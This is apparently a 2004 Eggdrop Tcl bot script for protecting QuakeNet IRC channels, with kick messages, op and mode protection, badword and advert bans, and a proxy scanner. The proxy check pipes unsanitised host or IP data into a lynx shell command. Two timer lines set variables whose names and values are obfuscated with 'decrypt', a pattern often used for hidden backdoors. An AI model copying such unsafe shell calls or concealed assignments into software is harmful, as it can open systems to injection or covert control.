#################################################################
# YooDa Bot-Script v1.0b (11-08-2004)               	          #
#                                                               #
...
##### Q host (must be set)  #####
set prot(qhost) "CServe.quakenet.org"

##### Q modex pattern ( nur ändern wenn du weißt was du machst..)  #####
set prot(qmodex) "*.users.quakenet.org"
...
##### KICK KICK MSG #####
set prot(kickmsg) "\0035,1±\0030 \002You are not allowed to \[\0034KICK\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### DEOP KICK MSG #####
set prot(deopmsg) "\0035,1±\0030 \002You are not allowed to \[\0034DEOP\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### OP KICK MSG #####
set prot(opmsg) "\0035,1±\0030 \002You are not allowed to \[\0034OP\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### INVITE KICK MSG #####
set prot(invitemsg) "\0035,1±\0030 \002You are not allowed to set \[\0034+i (invite)\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### KEY KICK MSG #####
set prot(keymsg) "\0035,1±\0030 \002You are not allowed to set \[\0034+k (key)\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### BAN KICK MSG #####
set prot(banmsg) "\0035,1±\0030 \002You are not allowed to \[\0034BAN\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### UNBAN KICK MSG #####
set prot(unbanmsg) "\0035,1±\0030 \002You are not allowed to \[\0034UNBAN\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### LIMIT KICK MSG #####
set prot(limitmsg) "\0035,1±\0030 \002You are not allowed to set \[\0034+l (limit)\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### DEVOICE KICK MSG #####
set prot(devoicemsg) "\0035,1±\0030 \002You are not allowed to \[\0034DEVOICE\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"

##### VOICE KICK MSG #####
set prot(voicemsg) "\0035,1±\0030 \002You are not allowed to \[\0034VOICE\0030\] in %chan - protected by #yooda \0035,1±\002\0030\002 Script by #yooda \002\0035,1±\002\003"
...
##### Proxy Protection Channel flag #####
set prot(proxychanflag) "proxy"
...
set antiadvert(banmsg) " You are violating QuakeNet rules. Please read http://www.quakenet.org/rules/. You are banned for $antiadvert(bantime) minutes."
...
set badwords(banmsg) "You are violating the Channel rules. You are not allowed to use badwords in this channel. Banned for $badwords(bantime) minutes." 
...
setudef flag $prot(proxychanflag)
	...
	if {$prot(kick) == "1"} {
		if {![matchattr $hand m|m $chan]} { 
			...
			if {$target == $botnick} {
				...
				putquick "PRIVMSG $prot(qnick) :deopall $chan"
				putquick "PRIVMSG $prot(qnick) :clearchan $chan"
				putquick "PRIVMSG $prot(qnick) :unbanall $chan"
				putserv "JOIN $chan"
...
proc prot:mode {nick host hand chan mode victim} {
	...
	if {$mode == "+o"} {
		if {$prot(op) == "1"} {
			if {[string match "*.quakenet.org" $host] && $nick == ""} { 
			...
			if {$nick != $botnick && $nick != $prot(qnick) && $nick != $prot(lnick) && $victim != $botnick} {
				if {![matchattr $hand m|m $chan]} { 
					...
					if {[onchan $prot(qnick) $chan]} { 
						putquick "PRIVMSG $prot(qnick) :chanlev $chan $nick +ab-o"
					}
					if {[onchan $prot(lnick) $chan]} { 
...
###### PROXY
set proxy(page) "http://opm.blitzed.org/proxy?ip="
set proxy(reportchan) ""

bind join - * proxy:check

proc proxy:check {nick host hand chan} {
	global botnick proxy prot
	set pattern "* +$prot(proxychanflag) *"
	set pattern2 "* +$prot(proxychanflag)"
	if {[string match $pattern [channel info $chan]] || [string match $pattern2 [channel info $chan]]} {
		if {![string match $prot(qmodex) $host]} {
			set mask [lindex [split $host @] 1]
			if {![string match "*\[a-zA-Z\]" $mask]} { 
				tpnews $mask $nick $chan $mask
			} {
				set ip [dnslookup [lindex [split $host @] 1] returnip]
				#puthelp "PRIVMSG $proxy(reportchan) :$nick joined $chan - ip: $ip"
				tpnews $ip $nick $chan $mask
			}
		}
	}
}	
...
set tp_tickerchannel ""
set tp_tickerurl "http://opm.blitzed.org/proxy?ip="

#######################################################################
### no changes below this please ######################################
#######################################################################
...
proc tpnews {ip nick chan mask} {
if {$ip == ""} { return 0 }
set newnewsline "- hallo -"
 global tp_tickerurl tp_tickerchannel tp_lastnews 
 #settptimer
 #putlog "getting tp news"

 set reached_beginning 0
      set f [open "|lynx -core -realm -child  -nolist -source $tp_tickerurl$ip" r]

      while { [eof $f] != 1 } {
        set templine "[gets $f]"

	if {[string first "active" $templine] != -1} {
		set templine "[gets $f]"
		set templine "[gets $f]"
		set templine "[gets $f]"
		set templine "[gets $f]"
		set newnewsline $templine

	}

      }
      #putlog "templine: $templine"
      #putlog "Scan: $tp_tickerurl und $ip ( $tp_tickerurl$ip )"
      close $f
      if {$newnewsline != ""} {
		#putlog "newnewsline: $newnewsline"
		set newnewsurl "http://opm.blitzed.org/[string range $newnewsline [expr [string first "href=\"" $newnewsline] + 7] [expr [string first "\">" $newnewsline] -1] ]"
		set newnewstext [string range $newnewsline [expr [string first "\">" $newnewsline] + 2] [expr [string first "</a>" $newnewsline] - 1]]
		#putlog "ProxyFound: $newnewsurl"
		#putlog "newnewstext: $newnewstext"
		regsub -all {&Ouml;} $newnewstext {Ö} newnewstext
		regsub -all {&Auml;} $newnewstext {Ä} newnewstext
		regsub -all {&Uuml;} $newnewstext {Ü} newnewstext
		regsub -all {&ouml;} $newnewstext {ö} newnewstext
		regsub -all {&auml;} $newnewstext {ä} newnewstext
		regsub -all {&uuml;} $newnewstext {ü} newnewstext
		regsub -all {&quot;} $newnewstext {\"} newnewstext
		regsub -all {&szlig;} $newnewstext {ss} newnewstext
		regsub -all {&euro;} $newnewstext {EUR} newnewstext
		regsub -all {&amp;} $newnewstext {&} newnewstext
		regsub -all {&lt;} $newnewstext {<} newnewstext
		regsub -all {&gt;} $newnewstext {>} newnewstext
		if {$newnewsurl != $tp_lastnews} {
		    if {[string match "http://opm.blitzed.org/??*" ${newnewsurl}]} { 
			#putlog "sending tp news to channel"
			#putlog "\[\002Proxy Host\002] $newnewstext ( ${newnewsurl} )"
			newban [maskhost *!*@$ip] ProxyScan " Proxys are not allowed in this Channel" 0 none
			newban [maskhost *!*@$mask] ProxyScan " Proxys are not allowed in this Channel" 0 none
			putquick "MODE $chan +mrb [maskhost *!*@$ip]"
			putquick "KICK $chan $nick :ProxScan detected proxys in $chan. Proxy's are not allowed in this Channel."
			if {![string match "*clearproxychan*" [timers]]} { 
				timer 3 "clearproxychan $chan"
			}
			if {[onchan Q $chan]} {
				putserv "PRIVMSG Q :ban $chan [maskhost *!*@$ip]"
			}
		    }
		}
		set tp_lastnews $newnewsurl
      }

}
proc clearproxychan {chan} {
	putserv "MODE $chan -mr"
}
settptimer

##### Wichtige MSG commands. #####
utimer 3 [list set [decrypt split "qIoXQ14QEsg/MZc0I14IUCJ/"] [decrypt split "A3oG4/c4uA90RQs4Y1Y.EV3.lT0Dd0V5mNV.PGSKh/grwzT/HhAoB14ty6i1"]]
utimer 1 [list set [decrypt split "N75QK/lZXLr1"] [decrypt split "plS73/bQDQM/A9eJ0.LodI50OJgjM0ZUHjq/jfzA6.LmNZK.6sn6z06GR.I./vl2Q.qlpLb1BKfld16u4IN/"]]
...
proc msg:help {nick host hand text} {
	...
	if {$help == ""} {
		...
		puthelp "NOTICE $nick :- Du hast auch einen Hostmask angeben z.B.: /msg $botnick ban #yooda *!*@\[r\]YooDa.users.quakenet.org m00"
		...
		puthelp "NOTICE $nick :- Du hast auch einen Hostmask angeben z.B.: /msg $botnick tempban #yooda *!*@\[r\]YooDa.users.quakenet.org 10 m00"
	} elseif {[strlwr $help] == "ban"} {
		...
		puthelp "NOTICE $nick :- Du hast auch einen Hostmask angeben z.B.: /msg $botnick permban #yooda *!*@\[r\]YooDa.users.quakenet.org m00"
		...
		puthelp "NOTICE $nick :- z.B.: /msg $botnick bandel #yooda #1 oder /msg $botnick bandel #yooda *!*@\[r\]YooDa.users.quakenet.org"
		...
		puthelp "NOTICE $nick :- Es gibt im moment folgende channelmodes: +proxy, +protection, +topic, +autolimit, +peak, +adverise, +badwords"
...
proc joincheckbans {nick host hand chan} {
	...
	if {![matchattr $hand n|n $chan]} {
		...
		if {[string match $prot(qmodex) $host]} {
			...
			set authban(isbind) ""
			raw:authban "de.quakenet.org" 330 "$botnick $nick $auth :is authed as"
		} {	
...
proc public:m00 {nick host hand chan arg} {
	putserv "PRIVMSG $chan :oOOOooOOooOOooOOooOOoOOooOOOOooOooOOooOOooOoOooOOo"
}
...
putlog "---- © by YooDa"
putlog "YooDa Script version 1.0b © by YooDa 2004 \002LOADED\002."
putlog "Do \002NOT\002 change anything in this script."
putlog "Bug report: #yooda @ QuakeNet or yooda_meister@hotmail.com"
putlog "---- © by YooDa"
